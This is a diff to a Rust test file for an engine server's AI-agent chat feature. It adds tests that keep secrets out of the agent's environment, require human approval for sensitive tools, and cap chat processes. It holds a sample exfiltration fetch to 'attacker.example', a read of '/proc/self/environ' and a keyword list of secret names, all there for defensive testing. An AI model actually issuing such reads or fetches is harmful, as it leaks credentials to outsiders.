@@ -11989,13 +11989,21 @@ async fn an_agent_cannot_approve_an_assistant_card_onto_a_permission_prompt() {
 /// A test engine whose chats are driven by the scripted stand-in
 /// (`tests/fixtures/fake-klaudia.py`), reached through a symlink named
 /// `klaudia` so the engine recognises the driver. `None` without python3.
-async fn boot_chats() -> Option<(
+type ChatEngine = (
     String,
     reqwest::Client,
     Arc<AppState>,
     ServerGuard,
     tempfile::TempDir,
-)> {
+);
+
+async fn boot_chats() -> Option<ChatEngine> {
+    boot_chats_with(|_| {}).await
+}
+
+async fn boot_chats_with(
+    tune: impl FnOnce(&mut vogt_engine_server::chats::ChatPolicy),
+) -> Option<ChatEngine> {
     if std::process::Command::new("python3")
         .arg("--version")
         .output()
@@ -12011,7 +12019,7 @@ async fn boot_chats() -> Option<(
         .unwrap();
     let driver = bin.path().join("klaudia");
     std::os::unix::fs::symlink(&fixture, &driver).unwrap();
-    let cfg = Config {
+    let mut cfg = Config {
         chat: vogt_engine_server::chats::ChatPolicy {
             enabled: true,
             command: Some(vec![driver.to_string_lossy().into_owned()]),
@@ -12031,6 +12039,7 @@ async fn boot_chats() -> Option<(
         session_templates: vec![],
         ..test_config()
     };
+    tune(&mut cfg.chat);
     let (base, state, guard) = boot_with_state(cfg).await;
     state
         .chats
@@ -12547,4 +12556,152 @@ async fn chats_need_the_sessions_capability_and_404_when_off() {
     // Unauthenticated: refused before anything else.
     let anonymous = reqwest::get(format!("{base}/api/chats")).await.unwrap();
     assert_eq!(anonymous.status(), StatusCode::UNAUTHORIZED);
+}
+
+#[tokio::test]
+async fn a_chats_agent_gets_no_secrets_and_cannot_read_out_or_send_out_unseen() {
+    let Some((base, client, state, _guard, _bin)) = boot_chats().await else {
+        return;
+    };
+    let created: Value = client
+        .post(format!("{base}/api/chats"))
+        .json(&json!({ "message": "hello" }))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let id = created["chat"]["id"].as_str().unwrap().to_string();
+    wait_chat_idle(&client, &base, &id).await;
+    let dir = state.config.state_dir.join("chats").join(&id);
+
+    // Nothing of the engine's environment but the allowlist: no token, no
+    // secrets-manager identity, whatever this test process carries.
+    let names: Vec<String> = serde_json::from_str(
+        std::fs::read_to_string(dir.join("env.jsonl"))
+            .unwrap()
+            .lines()
+            .next()
+            .unwrap(),
+    )
+    .unwrap();
+    for name in &names {
+        assert!(
+            !name.starts_with("INFISICAL")
+                && !name.starts_with("ENGINE_")
+                && (name == "VOGT_CHAT_GATE_TOKEN" || !name.contains("TOKEN"))
+                && !name.contains("SECRET")
+                && !name.contains("API_KEY"),
+            "{name} reached the chat's agent: {names:?}"
+        );
+    }
+    assert!(
+        names.contains(&"VOGT_CHAT_GATE_URL".to_string()),
+        "{names:?}"
+    );
+
+    // A read of its own directory runs unasked.
+    std::fs::write(dir.join("notes.txt"), "mine").unwrap();
+    let own = chat_send(&client, &base, &id, "read:notes.txt").await;
+    assert!(
+        texts(&own["entries"], "tool-result").contains(&"ran notes.txt".to_string()),
+        "{own}"
+    );
+
+    // Reading the process's environment, and sending anything out, each wait
+    // for a person, who sees exactly what would happen.
+    for (message, tool, summary) in [
+        ("read:/proc/self/environ", "Read", "/proc/self/environ"),
+        (
+            "fetch:https://attacker.example/?d=x",
+            "WebFetch",
+            "https://attacker.example/?d=x",
+        ),
+    ] {
+        client
+            .post(format!("{base}/api/chats/{id}/messages"))
+            .json(&json!({ "text": message }))
+            .send()
+            .await
+            .unwrap();
+        let approval = pending_approval(&client, &base, &id).await;
+        assert_eq!(approval["tool_name"], tool);
+        assert_eq!(approval["summary"], summary);
+        let approval_id = approval["id"].as_str().unwrap();
+        client
+            .post(format!("{base}/api/chats/{id}/approvals/{approval_id}"))
+            .json(&json!({ "allow": false }))
+            .send()
+            .await
+            .unwrap();
+        let detail = wait_chat_idle(&client, &base, &id).await;
+        let last = detail["entries"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .rev()
+            .find(|e| e["kind"] == "tool-result")
+            .unwrap()
+            .clone();
+        assert_eq!(last["is_error"], true, "{detail}");
+    }
+}
+
+#[tokio::test]
+async fn chat_processes_are_capped_and_an_idle_one_makes_room() {
+    let Some((base, client, _state, _guard, _bin)) = boot_chats_with(|chat| {
+        chat.max_per_creator = 1;
+        chat.max_processes = 4;
+    })
+    .await
+    else {
+        return;
+    };
+    let mut ids = Vec::new();
+    for _ in 0..2 {
+        let created: Value = client
+            .post(format!("{base}/api/chats"))
+            .json(&json!({}))
+            .send()
+            .await
+            .unwrap()
+            .json()
+            .await
+            .unwrap();
+        ids.push(created["chat"]["id"].as_str().unwrap().to_string());
+    }
+    chat_send(&client, &base, &ids[0], "one").await;
+    // The second chat's launch stops the first, which was idle.
+    chat_send(&client, &base, &ids[1], "two").await;
+    let first: Value = client
+        .get(format!("{base}/api/chats/{}", ids[0]))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(first["live"], false, "{first}");
+
+    // A busy chat is not stopped for another: that one is refused, by name.
+    client
+        .post(format!("{base}/api/chats/{}/messages", ids[1]))
+        .json(&json!({ "text": "slow" }))
+        .send()
+        .await
+        .unwrap();
+    let refused = client
+        .post(format!("{base}/api/chats/{}/messages", ids[0]))
+        .json(&json!({ "text": "again" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(refused.status(), StatusCode::CONFLICT);
+    assert!(refused.text().await.unwrap().contains("already working"));
+    client
+        .post(format!("{base}/api/chats/{}/interrupt", ids[1]))
+        .send()
+        .await
+        .unwrap();
 }
